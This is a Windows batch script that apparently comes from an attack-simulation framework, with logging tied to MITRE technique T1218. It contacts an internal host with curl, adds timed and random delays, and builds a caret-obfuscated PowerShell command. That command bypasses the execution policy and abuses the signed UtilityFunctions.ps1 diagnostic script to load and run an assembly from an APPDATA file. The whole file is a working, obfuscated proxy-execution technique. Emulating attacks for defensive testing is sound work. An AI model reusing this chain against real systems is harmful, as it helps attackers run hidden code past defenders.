@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET aqjsk=%APPDATA%\9269\99095e58
SET ydwlm=https://10.0.0.49
SET kqtxf=https://10.0.0.49/stage/2/icon.png?9269-10
SET vbctz=ITZEL-S2BO
SET pnwxd=10
SET rhyjm=exploren.txt
SET kpvfw=9269

SET logfile=%APPDATA%\!pnwxd!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!vbctz!]: script_start>> "!logfile!" 2>nul
echo [!DATE! !TIME!][DEBUG][!vbctz!]: initial_delay_start>> "!logfile!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!vbctz!]: initial_delay_complete>> "!logfile!" 2>nul

echo [!DATE! !TIME!][DEBUG][!vbctz!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!kqtxf!"
SET hbresult=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!vbctz!]: heartbeat_complete result=!hbresult!>> "!logfile!" 2>nul

echo [!DATE! !TIME!][DEBUG][!vbctz!]: inter_op_delay_start>> "!logfile!" 2>nul
ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!vbctz!]: inter_op_delay_complete>> "!logfile!" 2>nul

SET hc1=c^:^
SET hc2=\^w^
SET hc3=i^n^d^o^
SET hc4=w^s^
SET hc5=\^d^
SET hc6=i^a^g^n^o^s^t^i^c^s^\^
SET hc7=s^y^s^t^e^m^\^
SET hc8=n^e^t^w^o^r^k^i^n^g^
SET cdpath=!hc1!!hc2!!hc3!!hc4!!hc5!!hc6!!hc7!!hc8!
SET ps1=p^o^w^e^r^s^h^e^l^l^.^e^x^e
SET ps2=-^e^p^ ^b^y^p^a^s^s^ ^
SET ps3=-^c^o^m^m^a^n^d^ ^
SET ps4="s^e^t^-^l^o^c^a^t^i^o^n^ ^-^p^a^t^h^ ^
SET ps5=!cdpath!^
SET ps6=;^ ^i^m^p^o^r^t^-^m^o^d^u^l^e^ ^
SET ps7=.\^U^t^i^l^i^t^y^F^u^n^c^t^i^o^n^s^.^p^s^1^
SET ps8=;^ ^R^e^g^S^n^a^p^i^n^ ^
SET ps9=!aqjsk!^\!rhyjm!^
SET ps10=;^[^P^r^o^g^r^a^m^.^C^l^a^s^s^]^:^:^D^a^l^e^(^)^"

echo [!DATE! !TIME!][DEBUG][!vbctz!]: ps_command_construct_start>> "!logfile!" 2>nul
SET /A rdelay=%RANDOM% %% 15 + 5
echo [!DATE! !TIME!][DEBUG][!vbctz!]: random_delay_start sec=!rdelay!>> "!logfile!" 2>nul
timeout /t !rdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!vbctz!]: random_delay_complete>> "!logfile!" 2>nul

SET fullcmd=!ps1!!ps2!!ps3!!ps4!!ps5!;!ps6!!ps7!!ps8!!ps9!;!ps10!
echo [!DATE! !TIME!][DEBUG][!vbctz!]: ps_execute_start>> "!logfile!" 2>nul
!fullcmd! 2>nul
SET psresult=!ERRORLEVEL!

IF !psresult! EQU 0 (
    SET ttpresult=1
    SET ttpdetail=
) ELSE (
    SET ttpresult=0
    SET ttpdetail=assembly_load_failed
)

echo [!DATE! !TIME!][!vbctz!]: !pnwxd!-!kpvfw!-T1218|Signed Binary Proxy Execution=!ttpresult!::!ttpdetail!>> "!logfile!" 2>nul
echo [!DATE! !TIME!][DEBUG][!vbctz!]: ps_execute_complete result=!psresult!>> "!logfile!" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul
ENDLOCAL